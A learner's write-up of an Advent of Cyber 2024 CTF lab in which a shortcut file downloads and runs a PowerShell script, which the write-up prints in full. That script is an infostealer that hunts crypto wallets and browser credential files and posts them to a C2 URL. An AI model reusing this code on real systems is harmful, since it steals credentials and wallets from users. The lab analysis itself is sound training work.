# Advent Of Cyber 2024 🎄
Just a collection of what we did and learn on each day throughout the event.

## Day 01 (OPSEC)
So it basicly was about exploring a wesite which downloading a extra file with each download, when we use 'file' command we found it is a MS Windows Shortcut and then later to look at the meta-data this file was holding we used "Exiftool" to read it. We found it was running few powershell command which was disabling the restrictions and downloading the file from `"https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1"` and storing it in the `"C:\\ProgramData\\"` and then executing the script.

the script was :
```
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

The link of the script which is `"https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1"` so in here `MM-WarevilleTHM` is the github username of the person from which the script is downloading, now we know it's him but if we like to gather some more proof then, we look out for some unique part of the script `"Created by the one and only M.M"` and then try to search it on the github, which lead us to this issue:
`https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1` where user `MM-WarevilleTHM` was trying to ask questions about creating this script. 

when we go to his profile's username repository this is what we found:
```
- 🦹‍♂️ Hi, I’m M.M, also known as Mayor Malware. I run things in Wareville Town.
- 👀 This year, SOC-mas is not going to happen and I will do all I can to sabotage it.
- 🌱 I'll develop all necessary tools and plans to sabotage the event and frustrate the citizens of Wareville. One thing is to find someone to blame for all this. Maybe Glitch will take the blame.
- 📫 How to reach me? Find me around Wareville.
```

In Short:
We caught him. ✨😁
